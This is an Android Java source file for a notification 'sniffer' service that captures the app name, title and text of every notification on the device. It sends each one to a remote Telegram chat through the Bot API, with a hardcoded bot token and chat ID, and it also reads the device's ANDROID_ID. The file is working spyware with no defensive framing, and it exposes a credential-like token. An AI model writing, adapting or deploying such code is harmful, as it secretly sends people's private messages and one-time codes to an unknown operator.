package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.os.Bundle;
import android.os.BatteryManager;
import android.os.SystemClock;
import android.graphics.Point;
import android.graphics.BitmapFactory;
import android.view.Display;
import android.view.WindowManager;
import android.hardware.camera2.CameraCharacteristics;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import java.util.List;
import okhttp3.*;

public class NotificationService extends NotificationListenerService {

    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn.getPackageName().equals("android")) return;
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "No Title");
        Object text = extras.get(Notification.EXTRA_TEXT);
        String msg = "🎯 صيدة: " + sbn.getPackageName() + "\n👤: " + title + "\n💬: " + text;
        
        sendTelegram(msg);
    }

    private void sendTelegram(String msg) {
        OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .build();
        String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call c, IOException e) {}
            @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
        });
    }

    public String getDeviceIDUnique() {
        return android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
    }
}
